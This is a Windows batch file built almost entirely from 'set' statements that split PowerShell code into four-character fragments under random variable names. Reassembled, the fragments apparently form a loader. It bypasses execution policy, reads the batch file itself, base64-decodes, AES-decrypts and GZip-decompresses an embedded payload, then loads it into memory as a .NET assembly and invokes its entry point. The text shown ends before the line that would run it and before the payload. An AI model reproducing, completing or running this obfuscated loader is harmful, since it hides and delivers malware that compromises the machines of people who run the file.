@echo off
set "MazxPKPdSb=Bmor"
set "UGaggZtOvn=F'[-"
set "wdWtjkqzte=New-"
set "dBhOFCGpKO=[Env"
set "yIkXHKTEbl=);$l"
set "JczpIqDILr=ptog"
set "PikHHYgWAG=.Len"
set "ncVnYJERTj=ing("
set "AtXHkNCApS=;$cf"
set "MsXBxxQLVs=gGDs"
set "kdjsxJgQRz=ck($"
set "siUOEigogg=Kw.T"
set "vIiBDqaLRT=l5E7"
set "UqZyRdDPVe=Comp"
set "gqfgfjRxvj=hIFj"
set "axrfbtnHFb=-4] "
set "fxgPNstxKA=Kw);"
set "XikZEfpdlU=WRxk"
set "NmymbmLCMJ=3); "
set "RVsGZfCYvg= = $"
set "ixmDhuWfqr=zuZI"
set "aUElRuHSCm=RmKw"
set "JhGzfqbDPh=ay()"
set "BulVNAoLZQ=$PhI"
set "osALgWusEd=hIFj"
set "YzHwCPALkd=stem"
set "VzuaZAGTps= New"
set "akXawuGIjd=($gG"
set "jmUtqKjDBd=ispo"
set "lcpewZmObe=.Cry"
set "huuPPFkgIt=PhIF"
set "ulZMOLDfcp=$lRm"
set "GascDnmAsE=;$qJ"
set "ffNLYjMIta=daeR"
set "tHbbcGrOXb=.Sec"
set "KpeUNjOjnG=ion."
set "fywcrIYXOS=stem"
set "XHDecsVLmd='gni"
set "pGCaFnHFpb=;$QQ"
set "oHmGNixVDI=gMod"
set "GIoWsIjJPk=[Sys"
set "TotiZiGjct=ose("
set "BYeTyAXMJg=1] -"
set "DyTFyIXzpc=[-1."
set "xhKltQNEkn=orF'"
set "NaQjfvoyyA=).Sp"
set "twlaAXmrZQ=Invo"
set "uKTlenNOxY=);$P"
set "XmqdJKeYOe= [Sy"
set "wrWqKccQai=L4Yi"
set "bVREVevxJt=-joi"
set "ijgyiFrMdL=rtS4"
set "SxjcqfZisS=S46e"
set "sDgfTtPmAw=ddin"
set "xoBVVJWofV=6esa"
set "AlmQSGxDdQ=bjec"
set "eLCjryGOVl=g = "
set "BHhVHdvmqy=Mode"
set "xMyTLuMJSP=Dfq "
set "qRiDlTSinS=$QQE"
set "vCExCLzqdV=pose"
set "nlxiQDMIDu=V = "
set "CqdFNujbqd=)($b"
set "PBJIfPOnCy=yste"
set "RAhrxzASrW=oL'["
set "djeyexGPNV=comp"
set "SMGiCTagbZ=)) {"
set "kQvtidogQY=stem"
set "iBZTkcnRIx=em.I"
set "RyfiKQLOgS=esMa"
set "miLRQHzIOM=oryS"
set "qjdttHOUDS=$HWR"
set "rVDMsSbQsJ=.Ass"
set "ghBGhzWSIY=:('g"
set "ZRkFwiXMIA=xk.D"
set "uTGLhgYqMj=iron"
set "UphwmgJeWM=Umrz"
set "xzQeiKMHBz=();$"
set "uWBniSVEBV=:: '"
set "GlbtmiUjCP=le  "
set "hFFBnqSepw=Syst"
set "cqUCoYYJJh=BC;$"
set "QEewulBieS=tS46"
set "VYPQKeOuCP=s75K"
set "fYYdPvjSeN=ment"
set "goUdrAoXUj=;$tY"
set "fcwwYKITdK='')("
set "ANzQhIhYeD=.-16"
set "PanCkUaZRE=n ''"
set "DHIwRWXLMS=raph"
set "UuhFhWNXHf= = $"
set "FPAJacMGQT=Ety."
set "oYTXpRoRwS=ateD"
set "BpDFjFleLI=ionM"
set "msbqxGnnNi=y.Ci"
set "wJFkgWINOK=m.Re"
set "SjgXZMyZAJ=th('"
set "PnUbRRnvOW=-joi"
set "FviOAQulBG=e]::"
set "zhFzhLeymp=YxVw"
set "iTWTOZGSFl=$Umr"
set "KokKAeUDGE=m.IO"
set "bkDkwMACtR=.GZi"
set "IWcCVgmGLU=PTtG"
set "bdIqyIgoce=Kw ="
set "sgHgOMoeuM=y.Pa"
set "JmXmSQjbZP=r, 0"
set "gyTDHLAqNU=urit"
set "OyzTKYwvKz= '')"
set "XQiiglSKzj=..-1"
set "FLxHqheRkT='txe"
set "DYtVjjBhTt=hy.A"
set "UWfsvMEjdI=('%*'"
set "PYOGkLWrfE=ert]"
set "lTmpVfXDFe=dPSr"
set "REFPHDcWte= = N"
set "IqaAKfqSmf=rity"
set "sZyRulWAwR=CFxo"
set "laWppbVyfb=j.Pa"
set "lWgQrQaqtL=  $Q"
set "SEixalyoQl=RmAx"
set "cEknILwpOq=lBlo"
set "OaWSEjKrxV==');"
set "mhQbLUnAnO=tion"
set "TpwctnhbCi=.Cre"
set "JDmiyKgMWZ=null"
set "fUAyQbuFnm=[Sys"
set "AzHNMNzUBR=tsWi"
set "WhxSlmtoDr=mory"
set "uWkPzaAwJS=ptor"
set "FcOizaFzdS=$bdP"
set "ElPUfnUHGj=Sr);"
set "bqWvZLNAqB='[-1"
set "OECkfvvLtn=zHhH"
set "gIoCTHsvvD=hIFj"
set "KBvrkJhphW=; };"
set "EqSsUjTSQd=ose("
set "TaDKRqajSc=]::C"
set "MnwwjgPPsh=brea"
set "NjEWIwfsrO=-nop"
set "qaypTZjVdE=oArr"
set "PYNKgmzXPX=ewLi"
set "VxpUbEbEab=r = "
set "EHTPskMEHI=ddin"
set "kWoyRtdpLe=, $b"
set "CVQCRxHNKj=comm"
set "gDzYFXcRff=yste"
set "PcVnHHBZSJ=.Mem"
set "FYOSvmScEC=]::N"
set "hLHTJRwpLS=in $"
set "SxCQYCjncQ=();$"
set "zzOsFFabmJ=bypa"
set "WtSVrTRupb=Syst"
set "CNHYKPTysM=embl"
set "qkBHmDJmAh=zx ="
set "OmuRMtWnfg=bdPS"
set "LQRnhFLyQx=pres"
set "xHZnXuVVVC=$lRm"
set "nPuTmBCtUT=$bdP"
set "vupIBGldPc=form"
set "oMRXygnZDE=am;$"
set "AfGJfpzAIg=ct S"
set "QWZGVeiQWv=.Cop"
set "jkSYpUcJZM=.Con"
set "vGGqqhJIJy=16] "
set "gfIWdLymoe=lit("
set "kdqDQIHdTL=::De"
set "bOhAiOgxTc=-1.."
set "LBiPgFLPCr=rt]:"
set "sHUOMLRIIk=Dsa."
set "nVLkugknXC=ach "
set "JYnqpsjTrs=k = "
set "dvFCLyaOfZ=gjYA"
set "McZuIHZtZu=ct S"
set "pLfXyOBXHm=Dvye"
set "TFzapzxNXQ=Secu"
set "ebwleYRIMI=ke($"
set "wfCduQfdDA=t Sy"
set "iDxBlKdUCu=, (,"
set "xmIiNHmwRM=Fina"
set "snPbzKSmRB=YTkp"
set "jdsFYuatkm=onve"
set "EhVyGnZJPZ=)($Q"
set "kpOoEDMzEX=tem."
set "COKCYkSflA= [Sy"
set "ZuCySAnGQu=$qJo"
set "EPxzYCSkDV=eam("
set "qiNTKmZwqJ=qJoQ"
set "ZtKZsSJZZm=Obje"
set "utNnulFkxi= if "
set "qBHzaJEham=);$P"
set "IiAatINXHN=('da"
set "vgCTWKhuYq=rity"
set "CbpESeyaXC=bdPS"
set "ONCGquLqWt=V = "
set "kugjLYdlQl=q.En"
set "VUIWrGZddt=Ety "
set "ouBprxLNBy=ode]"
set "yfoOEUNAws=pStr"
set "ygrJCWrcLP=sion"
set "ngPeEwEDde=Disp"
set "WQOQNyvlhO=-ep "
set "HUsgBUlSkP= = ["
set "bXkWlCikJA=ss -"
set "hLkpDLUasG=7;$P"
set "DFxcgNSFFt=Conv"
set "PkgTiJPSIO=y.Cr"
set "ZhotyABTbb=Star"
set "vHOjqdoJcI=oQV."
set "QkNOAcBMyy=saBm"
set "qXydgOAnUB== $P"
set "kwTZkPavSP=pose"
set "LCqGAeruLD=('Tg"
set "xWpJkyYnbN=::('"
set "SFkQTptpBY=a.Su"
set "PnfoXPupld=$lRm"
set "QAuZIBDUau=[]] "
set "JwthPkanKR=6] -"
set "YpWRzbehIX=HWRx"
set "XwUYlzRpas=x) {"
set "JPAHWoJvfN='0Pg"
set "HlLZQaklPE=gnir"
set "sEUAbCjwlE=ecry"
set "GhYzxCaqfG=em.C"
set "XuHliVtCHp=yste"
set "psdGFyZZPA=);$H"
set "lrfvYaADCx=PKCS"
set "GvtaAGqOSI=esaB"
set "isKmKMlcSo=hIFj"
set "ZEKUkXBQHN=.Key"
set "RMIqhcITSl=..-1"
set "KEODYqooXx=m.IO"
set "iQGskmNdlT=[IO."
set "piTRTrabtg=n ''"
set "SYQRIaKgWw=-Obj"
set "yqgCuMXSLx=grap"
set "ajLSQDJtzK=.Mod"
set "sINznakOUg=);$t"
set "fjfZZsSDfI=QV, "
set "YMsUsVTSmH=join"
set "WmdgaxzITr=($gG"
set "rtiVtQrmjo=vert"
set "eLPXNsOexo=r = "
set "XbrqszvAir=ptog"
set "BSPhzdlcXz=('%~f0'"
set "mmhPkUTcPE=oint"
set "yuGaVpvVaR=bdPS"
set "GgKbnuKxAF=ress"
set "mWHHVakXSE=hIFj"
set "QdthLUoKut=ew-O"
set "ElvbFeZCXu=)))"
set "cvZydIfIit=1..-"
set "RPizSPOlZE=.IO."
set "EzhJPkpcSz=PxEW"
set "JkTfRqxnoT=.Com"
set "ErKaGTrzbZ=flec"
set "IDrkhonkab=Secu"
set "JOevjbMRAJ=Dsa "
set "qZImxpSszP=eMVs"
set "HZpavydDzw=nage"
set "WxuNlUDDrN=cfDf"
set "rvYeosriqR=oin "
set "mLLdjYAhsr=tryP"
set "PNVCGTROck=;$QQ"
